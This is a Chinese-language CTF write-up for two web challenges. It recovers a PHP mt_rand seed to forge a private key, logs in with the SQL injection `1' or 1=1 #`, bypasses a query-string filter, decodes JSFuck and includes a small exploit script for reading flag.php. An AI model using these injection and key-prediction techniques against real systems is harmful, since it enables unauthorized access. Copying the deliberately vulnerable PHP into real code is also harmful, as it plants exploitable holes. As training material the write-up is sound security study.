## Ezaudit
`www.zip`拿到index.php

```php
<?php 
header('Content-type:text/html; charset=utf-8');
error_reporting(0);
if(isset($_POST['login'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $Private_key = $_POST['Private_key'];
    if (($username == '') || ($password == '') ||($Private_key == '')) {
        // 若为空,视为未填写,提示错误,并3秒后返回登录界面
        header('refresh:2; url=login.html');
        echo "用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!";
        exit;
}
    else if($Private_key != '*************' )
    {
        header('refresh:2; url=login.html');
        echo "假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!";
        exit;
    }

    else{
        if($Private_key === '************'){
        $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';'; 
        $link=mysql_connect("localhost","root","root");
        mysql_select_db("test",$link);
        $result = mysql_query($getuser);
        while($row=mysql_fetch_assoc($result)){
            echo "<tr><td>".$row["username"]."</td><td>".$row["flag"]."</td><td>";
        }
    }
    }

} 
// genarate public_key 
function public_key($length = 16) {
    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $public_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
  }

  //genarate private_key
  function private_key($length = 12) {
    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $private_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
  }
  $Public_key = public_key();
  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???
```

用了mt_rand 伪随机计算
php_mt_seed 先推算随机数位置

```PYTHON
str1="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
public_key = "KVQP0LdJKRaV3n9D"

result = ""
for char in public_key:
	index = str(str1.find(char))
	result += index + " " + index + " " + "0" + " 61 "

print(result)
```

![](attachments/Pasted%20image%2020240330202007.png)

1775196155

```php
<?php
  mt_srand(1775196155);
// genarate public_key 
function public_key($length = 16) {
    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $public_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
  }

  //genarate private_key
  function private_key($length = 12) {
    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $private_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
  }
  $Public_key = public_key();
  $Private_key = private_key();
  echo $Public_key;
  echo '<br>';
  echo $Private_key;
```

![](attachments/Pasted%20image%2020240330204235.png)

XuNhoueCDCGc

在login.html 万能密码`1' or 1=1 #`带上私钥登录

## 套娃

![](attachments/Pasted%20image%2020240405084639.png)

```
b%20u%20p%20t=23333%0a
b.u.p.t=23333%0a
```

![](attachments/Pasted%20image%2020240405090007.png)


jsfuck 解密

```JS
alert("post me Merak")
```

```PHP
<?php   
error_reporting(0);   
include 'takeip.php';  
ini_set('open_basedir','.');   
include 'flag.php';  
  
if(isset($_POST['Merak'])){     
	highlight_file(__FILE__);   
    die();   
}   
  
  
function change($v){     
	$v = base64_decode($v);     
	$re = '';   
    for($i=0;$i<strlen($v);$i++){         
    $re .= chr ( ord ($v[$i]) + $i*2 );   
    }   
    return $re;   
}  
echo 'Local access only!'."<br/>";  
$ip = getIp();  
if($ip!='127.0.0.1')  
echo "Sorry,you don't have permission!  Your ip is :".$ip;  
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){  
echo "Your REQUEST is:".change($_GET['file']);  
echo file_get_contents(change($_GET['file'])); }  
?>
```

exp
```PHP
<?php
$s = "flag.php";
function dechange($v) {
	$re = '';
	for ($i = 0; $i < strlen($v); $i++) {
		$re .= chr(ord($v[$i]) - $i * 2);
	}
	return base64_encode($re);
}
echo(dechange($s));

```